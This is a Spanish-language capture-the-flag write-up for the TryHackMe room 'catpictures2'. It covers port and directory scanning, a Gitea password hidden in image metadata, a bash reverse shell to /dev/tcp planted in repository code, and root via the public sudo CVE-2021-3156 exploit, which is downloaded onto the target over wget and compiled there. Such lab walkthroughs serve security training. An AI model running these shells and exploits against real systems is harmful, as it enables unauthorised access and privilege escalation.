---
title: "catpictures2"
description: "catpictures2"
pubDate: 2025-05-20
---

https://tryhackme.com/r/room/catpictures2

# Fase de reconocimiento

## Buscamos puertos abiertos

Podemos añadir un -A para que sea mas agresivo

````
nmap -sS -p- -T5 --min-rate=5000 -vvv -Pn -n 10.10.93.53
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240503182631.png)

## Reconocimiento de servicios

````
nmap -sVC -p22,80,222,1337,3000,8080 -Pn 10.10.93.53
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240503183036.png)
![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240503183123.png)

## Gobuster

````
gobuster dir -u http://10.10.93.53 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 30
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240503183838.png)

````
gobuster dir -u http://10.10.93.53:1337 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 30
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240503184302.png)

````
gobuster dir -u http://10.10.93.53:3000 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 30
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240503184649.png)

````
gobuster dir -u http://10.10.93.53:8080 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 30
````

En 3000
![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240503182940.png)

# Fase de ataque

## Metadatos de una foto exiftool

````
exiftool cat.jpeg
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240503185605.png)
Encontramos una ruta en Tittle que contiene la contraseña de gitea
![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240503185641.png)
Este repositorio contiene una aplicación que corre en el equipo en el puerto 1337
![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240503190306.png)
![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240503190234.png)
Modificamos el código para una reverse shell

````
bash -c "bash -i>&1 /dev/tcp/10.9.2.97/1111 0>&1"
````

Nos ponemos en escucha por el puerto 111

````
nc -nlvp 111
````

Corremos la aplicación desde :1337

\[-\] ==pwned!==

## Ajustar terminal

````
script /dev/null -c bash
````

ctrl + z

````
stty raw -echo; fg
````

````
	reset xterm
````

````
export TERM=xterm
````

Ajustar proporciones

````
stty rows 44 columns 184
````

# Privilege Escalation

Numeramos archivos con permisos

````
find \-perm -4000 2>/dev/null
````

Encontramos un sudo
![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240503194938.png)
Miramos la version

````
sudo --version
````

Es vulnerable a un ataque de Buffer Overflow

## Exploit

https://github.com/blasty/CVE-2021-3156

1. 
   ````
   ````

````
git clone https://github.com/blasty/CVE-2021-3156
````

2. 

````
tar -cvf exploit.tar CVE-2021-3156
````

3. Abrimos un servidor para compartir el archivo

````
python3 -m http.server
````

4. Desde la maquina victima lo descargamos

````
wget http://10.17.54.133:8000/exploit.tar
````

5. Descomprimimos

````
tar xopf exploit.tar
````

6. Entramos en el directorio y compilamos

````
make
````

7. RUN

````
./sudo-hax-me-a-sandwich 0
````

\[+\] ==pwned!==
